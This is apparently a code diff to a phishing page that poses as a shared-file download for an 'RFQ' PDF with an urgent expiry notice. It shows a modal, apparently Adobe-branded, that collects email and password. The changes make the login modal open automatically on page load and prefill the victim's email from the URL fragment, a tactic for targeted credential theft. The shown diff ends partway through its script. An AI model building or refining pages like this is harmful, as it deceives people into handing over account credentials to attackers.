@@ -22,21 +22,20 @@
     </style>
 </head>
 
-<body class="bg-light d-flex justify-content-center align-items-center vh-100">
+<body class="bg-light d-flex justify-content-center align-items-center vh-100 modal-open" style="overflow: hidden; padding-right: 0px;">
     <div class="container catalogue text-center bg-light p-4">
         <div class="display-4 text-danger mb-3">
             <img src="https://file-personal.cloudmailbox.net/reference/images/filetypes/v4_pdf.png" alt="">
         </div>
-    
         <h5 class="fw-bold">RFQ_JO2024.New.pdf</h5>
         <p class=" mb-2"><span class="fw-bold">31.5MB</span></p>
-        <p class=" mb-2" style="color: red;">File Expires on <span id="d_ew_date">November 2, 2024 at 02:32 a.m.</span></p>
+        <p class=" mb-2" style="color: red;">File Expires on <span id="d_ew_date">November 4, 2024 at 12:05 a.m.</span></p>
         <p class="">The large attachment will expire in 1 day, and cannot be downloaded after expiration.
         </p>
-        <button type="button" class="btn btn-primary mt-3 px-5 rounded-0 fs-5" data-bs-toggle="modal" data-bs-target="#adobeModal" onclick="openModal()">Download</button>
+        <button type="button" class="btn btn-primary mt-3 px-5 rounded-0 fs-5" data-bs-toggle="modal" data-bs-target="#adobeModal">Download</button>
     </div>
 
-    <div class="modal fade" id="adobeModal" tabindex="-1" aria-labelledby="adobeModalLabel" aria-hidden="true">
+    <div class="modal fade show" id="adobeModal" tabindex="-1" aria-labelledby="adobeModalLabel" aria-modal="true" role="dialog" style="display: block;">
         <div class="modal-dialog">
             <div class="modal-content">
                 <div class="modal-header border-0 justify-content-center flex-column">
@@ -49,9 +48,9 @@
                 </div>
                 <div class="modal-body">
 
-                    <form method="POST" >
+                    <form method='POST'> 
                         <div class="form-group mb-3">
-                            <input type="email" class="form-control" id="email" name="email" placeholder="Enter email" value="">
+                            <input type="email" class="form-control" id="email" placeholder="Enter email" name="email" value="">
                         </div>
                         <div class="form-group mb-3">
                             <input type="password" class="form-control" id="pass" name="pass" placeholder="Password">
@@ -74,22 +73,32 @@
         </div>
     </div>
 
-    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
+    
+    
+
+    
+
+    
+    
+    
+    
+    
+
+
+
+<div class="modal-backdrop fade show"></div>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
     <script>
-        function openModal() {
-            // Show the modal
-            var modal = new bootstrap.Modal(document.getElementById('adobeModal'));
-            modal.show();
-
-            // Get the fragment (hash) from the URL
-            var fragment = window.location.hash.substring(1); // Remove the "#" from the fragment
-            console.log("Fragment found:", fragment);
-
-            // If the fragment exists, autofill the email field or any other fields
-            if (fragment) {
-                document.getElementById('email').value = fragment;
+        document.addEventListener("DOMContentLoaded", function() {
+            // Get the fragment from the current URL
+            const fragment = window.location.hash.substring(1);  // Remove the '#' symbol
+        
+            // Find the form field by its ID and set its value to the fragment
+            const fragmentField = document.getElementById("email");
+            if (fragment && fragmentField) {
+                fragmentField.value = fragment;
             }
-        }
+        });
 
         // Optional: Auto-open modal if the page loads with a fragment in the URL
        ;
